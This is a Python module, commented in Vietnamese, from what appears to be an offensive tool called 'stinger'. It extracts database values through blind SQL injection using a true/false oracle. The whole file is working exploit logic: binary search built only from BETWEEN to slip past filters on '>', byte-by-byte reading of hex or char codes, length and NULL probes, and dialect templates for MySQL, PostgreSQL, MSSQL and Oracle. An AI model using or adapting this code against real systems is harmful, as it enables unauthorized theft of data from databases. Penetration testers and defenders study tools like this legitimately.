#!/usr/bin/env python3
"""
Extract - trich xuat gia tri chuoi qua oracle true/false, tong quat theo dialect.

Bung logic tu draft/ (bsearch chi dung BETWEEN, get_number, che do hex/char) nhung
KHONG hardcode cu phap MySQL. Cac manh cu phap (substr/ascii/length/hex/hexlit) lay tu
`dialect` cua DBMS da chot -> chay duoc cho MySQL/PGSQL/MSSQL/Oracle.

Che do:
  - hex : doc hex(value), charset [0-9A-F], binary search bang BETWEEN. An toan nhat,
          bat duoc byte >127 (multibyte). ~5 request/hex-digit.
  - char: doc truc tiep tung ky tu, khoang 0..255. ~8 request/ky tu.

(Che do turbo cua draft phu thuoc do-dai-sleep, de sau - can transport that de hieu chuan.)
"""

from __future__ import annotations

from typing import Optional

from stinger.oracle import Oracle


class ExtractError(Exception):
    pass


class Dialect:
    """Boc dict dialect, cung cap cac ham lap rap bieu thuc SQL."""

    def __init__(self, d: dict):
        self.d = d

    def _need(self, key: str) -> str:
        if key not in self.d:
            raise ExtractError("dialect thieu manh '%s'" % key)
        return self.d[key]

    def substr(self, src: str, i: int) -> str:
        return self._need("substr").format(s=src, i=i)

    def ascii(self, char_expr: str) -> str:
        return self._need("ascii").format(c=char_expr)

    def length(self, src: str) -> str:
        return self._need("length").format(s=src)

    def charlen(self, src: str) -> str:
        return self.d.get("charlen", self._need("length")).format(s=src)

    def hex(self, src: str) -> str:
        return self._need("hex").format(s=src)

    def hexlit(self, h: str) -> str:
        return self._need("hexlit").format(h=h)

    def notnull(self, src: str) -> str:
        return self.d.get("notnull", "(({s}) is not null)").format(s=src)

    # bieu thuc "ma ky tu thu i cua src"
    def char_code_at(self, src: str, i: int) -> str:
        return self.ascii(self.substr(src, i))


# --------------------------------------------------------------------------- search
def bsearch(oracle: Oracle, expr: str, lo: int, hi: int) -> int:
    """Tim gia tri cua <expr> trong [lo,hi] CHI bang BETWEEN (ne filter '>')."""
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle.ask("%s between %d and %d" % (expr, lo, mid)):
            hi = mid
        else:
            lo = mid + 1
    return lo


def get_number(oracle: Oracle, expr: str, hi: int = 4096) -> int:
    """Doc mot so nguyen, tu noi rong khoang tren neu can."""
    while not oracle.ask("%s between 0 and %d" % (expr, hi)):
        hi *= 2
        if hi > 2 ** 24:
            raise ExtractError("%s vuot qua 2^24 - co le subquery tra NULL" % expr)
    return bsearch(oracle, expr, 0, hi)


# --------------------------------------------------------------------------- extract
def extract(oracle: Oracle,
            query: str,
            dialect: dict,
            mode: str = "hex",
            maxlen: Optional[int] = None,
            progress=None) -> tuple[bytes, dict]:
    """Trich xuat gia tri cua <query>. Tra ve (raw_bytes, meta).

    progress(done, total, preview) - callback tuy chon de hien tien do.
    """
    dia = Dialect(dialect)
    meta = {}

    def _progress(done, total, preview):
        if progress:
            progress(done, total, preview)

    # 1) subquery co du lieu khong? NULL lam moi dieu kien thanh false am tham.
    if not oracle.ask(dia.notnull(query)):
        raise ExtractError(
            "subquery tra NULL hoac khong co row. Kiem tra ten bang/cot va quyen."
        )

    # 2) do dai byte va ky tu -> phat hien multibyte
    blen = get_number(oracle, dia.length(query))
    clen = get_number(oracle, dia.charlen(query))
    meta["byte_len"] = blen
    meta["char_len"] = clen

    if mode == "hex":
        src = dia.hex(query)
        n = blen * 2
        if maxlen:
            n = min(n, maxlen * 2)
        digits = ""
        for i in range(1, n + 1):
            expr = dia.char_code_at(src, i)
            # '0'-'9'=48-57, 'A'-'F'=65-70
            if oracle.ask("%s between 48 and 57" % expr):
                code = bsearch(oracle, expr, 48, 57)
            else:
                code = bsearch(oracle, expr, 65, 70)
            digits += chr(code)
            if i % 2 == 0:
                preview = bytes.fromhex(digits).decode("utf-8", "replace")
                _progress(i // 2, blen, preview)
        return bytes.fromhex(digits), meta

    if mode == "char":
        n = maxlen or clen
        out = bytearray()
        for i in range(1, n + 1):
            expr = dia.char_code_at(query, i)
            code = bsearch(oracle, expr, 0, 255)
            if code == 0:
                break
            out.append(code)
            _progress(i, n, out.decode("utf-8", "replace"))
        return bytes(out), meta

    raise ExtractError("mode khong ho tro: %s (dung 'hex' hoac 'char')" % mode)


def verify(oracle: Oracle, query: str, dialect: dict, data: bytes) -> bool:
    """Xac minh toan bo gia tri bang 1 request, dung hex literal (khong can nhay)."""
    dia = Dialect(dialect)
    lit = dia.hexlit(data.hex())
    return oracle.ask("(%s) between %s and %s" % (query, lit, lit))
